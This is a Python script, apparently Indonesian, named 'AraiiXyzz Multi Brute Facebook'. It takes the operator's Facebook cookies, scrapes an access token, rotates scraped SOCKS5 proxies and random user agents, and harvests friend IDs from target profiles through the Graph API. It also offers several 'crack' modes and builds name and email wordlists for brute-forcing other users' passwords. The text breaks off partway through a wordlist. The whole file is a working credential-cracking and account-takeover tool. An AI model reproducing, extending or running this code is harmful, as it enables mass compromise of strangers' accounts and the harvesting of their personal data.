#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
from time import sleep
import time
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
import re,os,sys,rich,bs4,time, json,urllib3,base64,random,datetime,requests
from bs4 import BeautifulSoup as sop
from rich.console import Console as sol
from rich import print as prints
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
from rich import pretty
from rich.tree import Tree
from rich.table import Table
from rich.text import Text as tekz
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich.panel import Panel as nel
from rich.table import Table
from rich.panel import Panel as nel
from rich.table import Table as me
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import re,requests,os,time
import os,sys
import socket,threading
import datetime
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as AsepXc
from bs4 import BeautifulSoup as parse
from time import time as mek
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.console import Console
from rich import print as cetak
from rich.columns import Columns
from rich import print as Buat
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from getpass import getpass
from rich.text import Text as tekz
from rich.progress import track
from pwinput import pwinput
from rich.console import Console
from rich import print as cetak
from rich.console import Console
import requests , json , re , os , time
#-----------------[ MODUL BS4]-----------------#			
try:
	import bs4
except:
	print(f"\x1b[1;91m ╭───────────────────────────────────────────────────────\33[1;96m»")	
	print(f" \x1b[1;91m╰─\33[1;96m▶\033[95m 𝑻𝒖𝒏𝒈𝒈𝒖 𝑺𝒆𝒃𝒆𝒏𝒕𝒂𝒓 𝑷𝒓𝒐𝒔𝒆𝒔 𝑰𝒏𝒔𝒕𝒂𝒍𝒂𝒔𝒊 𝑴𝒐𝒅𝒖𝒍 𝑩𝒔4 ")
	os.system("pip install bs4")
	import bs4
#-----------------[ MODUL RICH ]-----------------#				
try:
	import rich
except:
	print(f"\x1b[1;91m ╭───────────────────────────────────────────────────────\33[1;96m»")	
	print(f" \x1b[1;91m╰─\33[1;96m▶\033[95m 𝑻𝒖𝒏𝒈𝒈𝒖 𝑺𝒆𝒃𝒆𝒏𝒕𝒂𝒓 𝑷𝒓𝒐𝒔𝒆𝒔 𝑰𝒏𝒔𝒕𝒂𝒍𝒂𝒔𝒊 𝑴𝒐𝒅𝒖𝒍 𝑹𝒊𝒄𝒉 ")
	os.system("pip install rich")
	import rich
#-----------------[ MODUL REQUESTS ]-----------------#			
try:
	import requests
except:
	print(f"\x1b[1;91m ╭───────────────────────────────────────────────────────\33[1;96m»")	
	print(f" \x1b[1;91m╰─\33[1;96m▶\033[95m 𝑻𝒖𝒏𝒈𝒈𝒖 𝑺𝒆𝒃𝒆𝒏𝒕𝒂𝒓 𝑷𝒓𝒐𝒔𝒆𝒔 𝑰𝒏𝒔𝒕𝒂𝒍𝒂𝒔𝒊 𝑴𝒐𝒅𝒖𝒍 𝑹𝒆𝒒𝒖𝒆𝒔𝒕𝒔 ")
	os.system("pip install requests")
	import requests
#-----------------[ MODUL STDIOMASK ]-----------------#				
try:
	import stdiomask
except:
	print(f"\x1b[1;91m ╭───────────────────────────────────────────────────────\33[1;96m»")	
	print(f" \x1b[1;91m╰─\33[1;96m▶\033[95m 𝑻𝒖𝒏𝒈𝒈𝒖 𝑺𝒆𝒃𝒆𝒏𝒕𝒂𝒓 𝑷𝒓𝒐𝒔𝒆𝒔 𝑰𝒏𝒔𝒕𝒂𝒍𝒂𝒔𝒊 𝑴𝒐𝒅𝒖𝒍 𝑺𝒕𝒅𝒊𝒐𝒎𝒂𝒔𝒌 ")
	os.system("pip install stdiomask")
	import stdiomask
#-----------------[ MODUL PWINPUT ]-----------------#			
try:
	import pwinput
except:
	print(f"\x1b[1;91m ╭───────────────────────────────────────────────────────\33[1;96m»")	
	print(f" \x1b[1;91m╰─\33[1;96m▶\033[95m 𝑻𝒖𝒏𝒈𝒈𝒖 𝑺𝒆𝒃𝒆𝒏𝒕𝒂𝒓 𝑷𝒓𝒐𝒔𝒆𝒔 𝑰𝒏𝒔𝒕𝒂𝒍𝒂𝒔𝒊 𝑴𝒐𝒅𝒖𝒍 𝑷𝒘𝒊𝒏𝒑𝒖𝒕 ")
	os.system("pip install pwinput")
	import pwinput
#-----------------[ DATA AUTHOR ]-----------------#			
data = {
  'Author' : 'ARAIIXYZZ' , 
  'Facebook' : '' , 
  'Github' : '',
  'Versi' : '1.0',
  'Script' : 'Dump',
  'Stat' : ''
}
#-----------------[ INDIKASI INT ]-----------------#			
ses = requests.Session()
uid , uid2 , uid3 = [] , [] , []
ok , cp , loop = 0 , 0 , 0
#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
uidl =[]
opsi=[]
uidf=[]
liu=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; AMBF | AraiiXyzz Multi Brute Facebook\x07')
#------------------[ USER-AGENT PROXY]-------------------#
#-----------[ USER-AGENT PROXY ]----------------#
try:
    # Ambil data proxy dari API
    prox = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
    
    # Simpan ke file proxy.txt
    with open('proxy.txt', 'w') as f:
        f.write(prox)

    # Baca kembali dari proxy.txt
    with open('proxy.txt', 'r') as f:
        prox = f.read().splitlines()

except Exception as e:
    os.system('clear')
    print(f"\x1b[1;91m")
    print(f"\x1b[1;91m └──\x1b[1;96m► \033[95m JARINGAN LU JELEK BANG COBA LAGI ");exit()
#----------[USER AGENT ]---------#  
for me in range(10000):
	rr = random.randint
	rc = random.choice
	Seriku = str(rc(["N4LEFH","TQ2A","QQ1B","PQ1A","SQ3A","RD1B","LDK2WU","SD2A","AB03E'","Z367Q","R8638","C886H"]))
	Devku = str(rc(["Pixel 8 XL","Galaxy Z Flip 6G","Galaxy M11","Xperia 1 IV","waZenFone 8 Go","Reno8 Lite","Reno4 Z","Xperia 10 III","Pixel 5a 5G","Mate X2","Pixel 3a","ZenFone AR","OnePlus 11","OnePlus 15","LG Rollable","Galaxy Tab S7 ","Reno6 Z","Moto G7","Vivo Y93","OnePlus 17T","ZenFone 3 Zoom","LG Stylo 6","LG Flex","LG Rollable 2","Xperia XZ Premium","Reno12 Pro","Vivo Y160","ZenFone 6","Pixel 4a","MateScreen V","Galaxy M12","ZenFone 8","OnePlus 12","Xperia XA2 Ultra","Galaxy A90","LG Flex 4","Pixel 2a","Mate 30 Pro","LG K51S","Pixel 6 Pro","iPhone 11","Xperia 10 Plus III","Pixel 2 XL","LG Flex 3","MatePad 13)","Vivo Y120G","Xperia Ultra","Mi 11 Ultra","Vivo X30 Pro","Vivo Y33s","Mate 10 Lite","Reno5 Lite","Mi 21 Lite","iPhone SE (2023))","Mi Note 10","LG G7 ThinQ","Galaxy A120","Mate 8)","Xperia 1 II","ZenFone 12 Mini","iPhone XS","Xperia 4 II","Moto Z2 Force","Galaxy A52 5G","Xperia 5 II","iPhone 11 Pro Max","LG Fold 2","Reno13 5G","Galaxy Tab S9 ","OnePlus 8T"]))
	AraiiXyzz1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,30))}; {Devku}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100, 555))}.0.{str(rr(3000,6000))}.{str(rr(100, 555))} Mobile Safari/537.36 Vivaldi/{str(rr(100, 555))}.0.{str(rr(1001, 5555))}.{str(rr(100, 555))}"
	AraiiXyzz2 = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,30))}; WOW64){Seriku}) Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/{str(rr(100, 555))}.0.{str(rr(1001, 5555))}.{str(rr(100, 555))}"
	uaku = random.choice([AraiiXyzz1,AraiiXyzz2])
	ugen.append(uaku)
#-----------------[ CEK TAHUN IDZ ]-----------------#			
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz	
def clear():
    os.system('clear')
#------------[ INDIKATOR ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
ses=requests.Session()
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER- DATA ]--------------#
try:cek_data = requests.get("http://ip-api.com/json/").json()
except:cek_data = {'-'}
try:asal_kota = cek_data["city"]
except:asal_kota = {'-'}
try:asal_reg = cek_data["region"]
except:asal_reg = cek_data['-']
try:times = cek_data["timezone"]
except:times = cek_data['-']
try:city = cek_data["city"]
except:city = cek_data['-']
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def loading():
    animation = [
        "[\x1b[1;91m▶\x1b[0m□□□□□□□□□]",
        "[\x1b[1;92m▶▶\x1b[0m□□□□□□□□]",
        "[\x1b[1;93m▶▶▶\x1b[0m□□□□□□□]",
        "[\x1b[1;94m▶▶▶▶\x1b[0m□□□□□□]",
        "[\x1b[1;95m▶▶▶▶▶\x1b[0m□□□□□]",
        "[\x1b[1;96m▶▶▶▶▶▶\x1b[0m□□□□]",
        "[\x1b[1;97m▶▶▶▶▶▶▶\x1b[0m□□□]",
        "[\x1b[1;98m▶▶▶▶▶▶▶▶\x1b[0m□□]",
        "[\x1b[1;99m▶▶▶▶▶▶▶▶▶\x1b[0m□]",
        "[\x1b[1;910m▶▶▶▶▶▶▶▶▶▶\x1b[0m]",
    ]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r{m}╰─{b}▶{b} 𝐓𝐮𝐧𝐠𝐠𝐮 𝐒𝐞𝐛𝐞𝐧𝐭𝐚𝐫 " + animation[i % len(animation)] + "\x1b[0m "
        )
        sys.stdout.flush()


#------------------[ MESIN PENDUKUNG ]---------------#
def Araii_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO ATAU BANNER ]-----------------#
def banner():
	clear()
	cetak(panel(f''' [bold cyan] _______ ______ _______ _______ _______ ___ ___ ___ ___ _______ _______ 
 [bold cyan]|   _   |   __ \   _   |_     _|_     _|   |   |   |   |__     |__     |
 [bold cyan]|       |      <       |_|   |_ _|   |_|-     -|\     /|     __|     __|
 [bold cyan]|___|___|___|__|___|___|_______|_______|___|___| |___| |_______|_______|    
                        ''',width=77,style=f"bold red")) 
#--------------------[ DATA COKIEE ]--------------#
def login():
	try:
		token = open('.araiixyzztok.txt','r').read()
		cok = open('.araiixyzzcok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			raii2 = json.loads(sy.text)['name']
			raii3 = json.loads(sy.text)['id']
			menu(raii2,raii3)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
			print(f"\x1b[1;92m╰─\033[95m▶\033[33m JARINGAN LU JELEK BANG COBA LAGI ")
			exit()
	except IOError:
		login_lagi()
#--------------------[ INPUT COKIEE ]--------------#
def login_lagi():
	asu = random.choice([m,k,h,b,u])
	os.system('clear')
	banner()
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	cok = input(f'{m}╰─{b}▶{b} 𝑪𝒐𝒐𝒌𝒊𝒆𝒔 : {u}')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'{k}  𝑪𝒐𝒐𝒌𝒊𝒆𝒔 𝑰𝒏𝒗𝒂𝒍𝒊𝒅 ');time.sleep(2);exit()				
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)',xz.text).group(1)
				open('.araiixyzztok.txt','w').write(took)
				open('.araiixyzzcok.txt','w').write(cok)			
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				print(f"{m}╰─{b}▶{b} 𝑻𝒐𝒌𝒆𝒏 : {u}{took} ")
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				print(f"{m}╰─{b}▶{b} 𝑳𝒐𝒈𝒊𝒏 𝑪𝒐𝒐𝒌𝒊𝒆𝒔 𝑺𝒖𝒌𝒔𝒆𝒔 𝑻𝒖𝒏𝒈𝒈𝒖 𝑺𝒆𝒃𝒆𝒏𝒕𝒂𝒓....")
				time.sleep(3)
				exit()
#--------------------[ REMOVE COKIEE ]--------------#				
	except Exception as e:
		os.system("rm -f .araiixyzztok.txt")
		os.system("rm -f .araiixyzzcok.txt")
		print(e)
		exit()
#------------------[ DAFTAR MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.araiixyzztok.txt','r').read()
		cok = open('.araiixyzzcok.txt','r').read()
	except IOError:
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		print(f"{m}╰─{b}▶{b} 𝑪𝒐𝒐𝒌𝒊𝒆𝒔 𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝑳𝒐𝒈𝒊𝒏 𝑼𝒍𝒂𝒏𝒈!!")
		time.sleep(2)
		login_lagi()
	os.system('clear')
	banner()
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	ip = requests.get("https://api.ipify.org").text
	#print(f"{m}╭───────────────────────────────────────────────────────────────────────────╮")	
	#print(f'{m}╰─{u}> {u}[{P}ARAIIXYZZ{u}]{u}[{P}RAZOR{u}][{P}APRI{u}][{P}RULLYXYZ{u}][{P}FIIXC4YOU{u}][{P}ASEP{u}][{P}YAKUZA{u}][{P}VLADIMIR{u}] {u}<{P}─╯')
	#print(f'{m}╭─{u}>   [{P}TERIMA KASIH ATAS KONTRIBUSINYA UNTUK SEMUA PIHAK YANG TERKAIT{u}]    {u}<{P}─╮')
	#print(f"{m}╰───────────────────────────────────────────────────────────────────────────╯")	
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f'{m}╰─{b}▶{u}[{b}×{u}]{b} 𝗗𝗘𝗖𝗢𝗗𝗘       : {u}𝗔𝗥𝗔𝗜𝗜𝗫𝗬𝗭𝗭  ') 
	print(f"{m}╰─{b}▶{u}[{b}×{u}]{b} 𝗡𝗔𝗠𝗔 𝗞𝗔𝗠𝗨    : "+u+str(my_name))
	print(f"{m}╰─{b}▶{u}[{b}×{u}]{b} 𝗜𝗗𝗭 𝗞𝗔𝗠𝗨     : "+u+str(my_id))
	print(f"{m}╰─{b}▶{u}[{b}×{u}]{b} 𝗡𝗘𝗚𝗔𝗥𝗔       : "+u+str(negara))
	print(f"{m}╰─{b}▶{u}[{b}×{u}]{b} 𝗣𝗥𝗢𝗩𝗜𝗡𝗦𝗜     : "+u+str(asal_kota))
	print(f"{m}╭─{b}▶{u}[{b}×{u}]{b} 𝗪𝗜𝗟𝗔𝗬𝗔𝗛 𝗔𝗥𝗘𝗔 : "+u+str(asal_reg))
	print(f"{m}╭─{b}▶{u}[{b}×{u}]{b} 𝗭𝗢𝗡𝗔 𝗪𝗔𝗞𝗧𝗨   : "+u+str(times))
	print(f"{m}╭─{b}▶{u}[{b}×{u}]{b} 𝗧𝗔𝗡𝗚𝗚𝗔𝗟      : "+u+str(tanggal))
	print(f"{m}╭─{b}▶{u}[{b}×{u}]{b} 𝗜𝗣 𝗔𝗗𝗗𝗥𝗘𝗦    : "+u+ip)
	print(f'{m}╭─{b}▶{u}[{b}×{u}]{b} 𝗦𝗧𝗔𝗧𝗨𝗦       : {u}-  ')
	print(f'{m}╭─{b}▶{u}[{b}×{u}]{b} 𝗔𝗞𝗧𝗜𝗙        : {u}- ')
	print(f"{m}╰───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f'{m}╰─{b}▶{u}[{b}A{u}]{m}.{b}𝗖𝗥𝗔𝗖𝗞 {u}𝗣𝗨𝗕𝗟𝗜𝗞   ')
	print(f'{m}╰─{b}▶{u}[{b}B{u}]{m}.{b}𝗖𝗥𝗔𝗖𝗞 {u}𝗠𝗔𝗦𝗦𝗔𝗟  ')
	print(f'{m}╰─{b}▶{u}[{b}C{u}]{m}.{b}𝗖𝗥𝗔𝗖𝗞 {u}𝗘𝗠𝗔𝗜𝗟    ')
	print(f'{m}╰─{b}▶{u}[{b}D{u}]{m}.{b}𝗖𝗥𝗔𝗖𝗞 {u}𝗙𝗜𝗟𝗘    ')
	print(f'{m}╰─{b}▶{u}[{b}E{u}]{m}.{b}𝗖𝗥𝗔𝗖𝗞 {u}𝗚𝗥𝗨𝗣    ')
	print(f'{m}╭─{b}▶{u}[{b}F{u}]{m}.{b}𝗖𝗥𝗔𝗖𝗞 {u}𝗡𝗔𝗠𝗔   ')
	print(f'{m}╭─{b}▶{u}[{b}G{u}]{m}.{b}𝗖𝗛𝗘𝗖𝗞 {u}𝗥𝗘𝗦𝗨𝗟𝗧  ')
	print(f'{m}╭─{b}▶{u}[{b}H{u}]{m}.{b}𝗗𝗨𝗠𝗣  {u}𝗜𝗗      ')
	print(f'{m}╭─{b}▶{u}[{b}I{u}]{m}.{b}𝗟𝗔𝗣𝗢𝗥 {u}𝗕𝗨𝗚      ')
	print(f'{m}╭─{b}▶{u}[{b}J{u}]{m}.{b}𝗛𝗔𝗣𝗨𝗦 {u}𝗖𝗢𝗢𝗞𝗜𝗘𝗦 ')
	print(f"{m}╰───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	ARSY = input(f'{m}╰─{b}▶{b} 𝗣𝗜𝗟𝗜𝗛 :{u} ')
	if ARSY in ['a','A']:
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		idt = input(f"{m}╰─{b}▶{b} 𝗠𝗔𝗦𝗨𝗞𝗞𝗔𝗡 𝗜𝗗 : {u}")
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif ARSY in ['b','B']:
		massal()
	elif ARSY in ['c','C']:
		mail()
	elif ARSY in ['d','D']:
		file()
	elif ARSY in ['e','E']:
		grup()
	elif ARSY in ['f','F']:
		sandi()		
	elif ARSY in ['g','G']:
		result()				
	elif ARSY in ['h','H']:
		ngedumpid() 
	elif ARSY in ['i','I']:
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		print(f"{m}╰─{b}▶{b} 𝗧𝗨𝗡𝗚𝗚𝗨 𝗦𝗘𝗕𝗘𝗡𝗧𝗔𝗥.........")
		time.sleep(3)
		os.system("xdg-open http://wa.me//6282371111202?text=Bang+Saya+mau+lapor+BUG+Dan+Saran")
		back()
	elif ARSY in ['j','J']:
		os.system('rm -rf .araiixyzztok.txt')
		os.system('rm -rf .araiixyzzcok.txt')
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		print(f"{m}╰─{b}▶{b}𝗖𝗢𝗢𝗞𝗜𝗘𝗦 𝗦𝗨𝗖𝗖𝗘𝗦 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 ")
		exit()
	else:
		back()
def error():
	time.sleep(4)
	back()
#----------[ CRACK-PUBLIK  ]----------#            
def dump(idt,fields,cookie,token):
	try:
		headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
		if len(id) == 0:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
		else:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r{m}╭─{b}▶{b} 𝗚𝗘𝗧𝗧𝗜𝗡𝗚 𝗜𝗗𝗭 : {u}{len(id)}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

#-------------------[ CRACK-MASSAL]----------------#
def massal():
	try:
		token = open('.araiixyzztok.txt','r').read()
		cok = open('.araiixyzzcok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		jum = int(input(f'{m}╰─{b}▶{b} 𝗠𝗔𝗨 𝗕𝗘𝗥𝗔𝗣𝗔 𝗜𝗗  : {u}'))
	except ValueError:
		exit()
	if jum<1 or jum>999999:
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f'{m}|─{b}▶{b} 𝗜𝗗𝗭 𝗬𝗔𝗡𝗚 𝗞𝗘 '+str(jumlah_input)+f'  : {u}')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r{m}╭─{b}▶{b} 𝗚𝗘𝗧𝗧𝗜𝗡𝗚 𝗜𝗗𝗭    : {u}{len(id)}");sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		back()
#----------[ CRACK EMAIL ]-----------#
def mail():
	dump=[]
	rc = random.choice
	rr = random.randint
	depan = ['erci','pubg','gibran','babi','ica','saya','memek','pepek','mulyati','deva','tasya','fahru','jokowi','merdeka','epep','stokakun','legend','wibu','bokep','prabowo','chandra','mobilelegend','nabila','nazri','nizar','reni','aidil','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','freefire','pubg','anjay','sahrul','sayang','anjing','kontol','mobilelegend','jaki','juned','fikri','dika','nanang','agus','bode','acill','ilham','eka','toni','toto','bagus','bagas','joko','erik','samsul','udin','ucup','endang','dudung','putra','bondol','cecep','jamal','rifki','cicih','cucu','iis','dahlia','imas','nanda','nazwa','zahra','zahwa','fitri','neni','encin','titin','yoyoh','iin','ineke','andin','tari','ninis','nesya','firda','septi','lasma','mutia','mpit','sifa','siti','syifa','zahra','elin','mela','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	belakang = ['boy','mabok','eam','aulia','kasih','cantik','kasep','ganteng','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep','sunda','nazri','nizar','reni','aidil','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','l